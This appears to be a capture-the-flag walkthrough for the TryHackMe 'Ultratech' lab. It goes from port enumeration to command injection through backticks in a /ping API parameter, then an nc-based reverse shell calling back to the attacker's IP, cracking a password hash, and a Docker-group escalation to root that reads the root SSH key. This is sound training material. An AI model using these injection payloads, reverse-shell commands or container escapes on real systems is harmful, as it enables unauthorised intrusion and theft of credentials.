# TryHackMe — Ultratech — Walkthrough

> Walkthrough for the *Ultratech* room.

---

## Enumeration

Start with a port scan (nmap). Results found during enumeration:

```
21      : FTP
22      : SSH
8081    : Node.js Backend (REST API)
31331   : Apache Web Server
```

**Conclusions:**

* Software using port **8081**: **Node.js** (REST API)
* Other non-standard port: **31331**
* Software using port **31331**: **Apache**
* Probable GNU/Linux distribution: **Ubuntu**

Directory listing was enabled on Apache, can be verified by visiting the /images endpoint. On visiting the /js endpoint we find the api.js file which shows that the webserver uses 2 api endpoints (/auth and /ping).

---

## Task 2 — Quick Answers

* **Which software is using the port 8081?** `Node.js`
* **Which other non-standard ports are used?** `31331`
* **Which software is using this port?** `Apache`
* **Which GNU/Linux distribution seems to be used?** `Ubuntu`
* **The software using port 8081 is a REST api — how many of its routes are used by the web application?** `2` (`/ping` and `/auth`)

---

## Task 3 — Command Injection and Reverse Shell

The `/ping` endpoint executes the system `ping` with the provided IP parameter. This allows command substitution.

### Verifying command substitution

Example: trigger command substitution via backticks

```
http://<IP>:8081/ping?ip=`ls`
```

The response returned the `ls` output, confirming command execution.

### Getting a reverse shell (one approach)

1. Create a payload on the target using `nc`:

   ```
   http://<IP>:8081/ping?ip=`nc $YOUR_IP $YOUR_PORT > payload`
   ```

2. On your machine, listen for a connection:

   ```
   nc -lnvp <YOUR_PORT>
   ```

3. Once the connection is received, write or paste the payload into the connection (or transfer the payload file). You can find one at [revshells.com](https://revshells.com).

4. Execute the payload on the target:

   ```
   http://<IP>:8081/ping?ip=`python3 payload`
   ```

5. You should receive a shell.

---

## Database and Credentials

A database file was discovered on the API host at `/home/www/api`.

* **Database filename:** `utech.db.sqlite`
* **First user's password hash:** `f357a0c52799563c7c7b76c1e7543a32`
* **Plaintext password (cracked):** `n100906` (cracked using CrackStation)

---

## Task 4 — Privilege Escalation (Docker Group)

After obtaining user shell and checking `sudo -l`, `sudo` was not available for privilege escalation. However, the user r00t is a member of the `docker` group.

### Docker abuse to become root

If you have access to run Docker (membership of `docker` group), you can mount the host filesystem inside a container and get a root shell:

```bash
docker container run --rm -it -v /:/app bash
```

This mounts the host (`/`) into `/app` inside the container and gives an interactive shell with root privileges (because Docker daemon runs as root).

Once inside, navigate to `/root/.ssh/id_rsa` and copy the first 9 characters of the private key.

* **Answer (first 9 letters of root private key):** `MIIEogIBA`

